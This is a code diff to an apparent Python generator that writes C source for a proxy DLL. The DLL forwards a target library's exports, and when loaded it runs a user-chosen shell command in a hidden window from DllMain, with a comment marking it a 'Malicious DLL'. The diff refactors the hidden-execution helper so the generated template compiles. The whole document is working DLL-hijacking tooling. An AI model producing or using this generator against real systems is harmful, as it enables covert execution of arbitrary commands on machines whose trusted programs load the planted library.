@@ -30,7 +30,7 @@ def main():
     output: str = args.output
     orig_path: str = args.orig_path
     basename = os.path.basename(dll)
-    command: str = args.command
+    shell_command: str = args.command
     if output is None:
         file, _ = os.path.splitext(basename)
         output = f"proxy_{file}.c"
@@ -83,6 +83,30 @@ def main():
 // i686-w64-mingw32-gcc -shared -o proxy_{basename} {output} {output_def}
 // i686-w64-mingw32-strip proxy_{basename}
 
+DWORD RunHiddenCommand(const char* command) {{
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    DWORD exit_code = 0xFFFFFFFF;
+
+    // Zero the structures
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    // The CREATE_NO_WINDOW flag is what prevents the console window from appearing
+    if (CreateProcessA(NULL, (char*)command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)
+        ) {{
+        // Wait until child process exits
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        GetExitCodeProcess(pi.hProcess, &exit_code);
+
+        // Always close handles to avoid leaks
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }}
+    return exit_code;
+}}
+
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved
@@ -93,37 +117,8 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     case DLL_PROCESS_ATTACH: 
         {{
             // MessageBoxA(NULL, "Executing from Malicious DLL", "Executing from Malicious DLL", 0);
-
-            STARTUPINFOA si = {{ 0 }};
-            PROCESS_INFORMATION pi = {{ 0 }};
-            si.cb = sizeof(si);
-
-            DWORD RunHiddenCommand(const char* command) {{
-                STARTUPINFOA si;
-                PROCESS_INFORMATION pi;
-                DWORD exit_code = 0xFFFFFFFF;
-
-                // Zero the structures
-                ZeroMemory(&si, sizeof(si));
-                si.cb = sizeof(si);
-                ZeroMemory(&pi, sizeof(pi));
-
-                // The CREATE_NO_WINDOW flag is what prevents the console window from appearing
-                if (CreateProcessA(NULL, (char*)command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)
-                    ) {{
-                    // Wait until child process exits
-                    WaitForSingleObject(pi.hProcess, INFINITE);
-                    GetExitCodeProcess(pi.hProcess, &exit_code);
-
-                    // Always close handles to avoid leaks
-                    CloseHandle(pi.hProcess);
-                    CloseHandle(pi.hThread);
-                }}
-                return exit_code;
-            }}
             // Insert command here.
-            RunHiddenCommand("{command}");
-
+            RunHiddenCommand("{shell_command}");
         }};
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
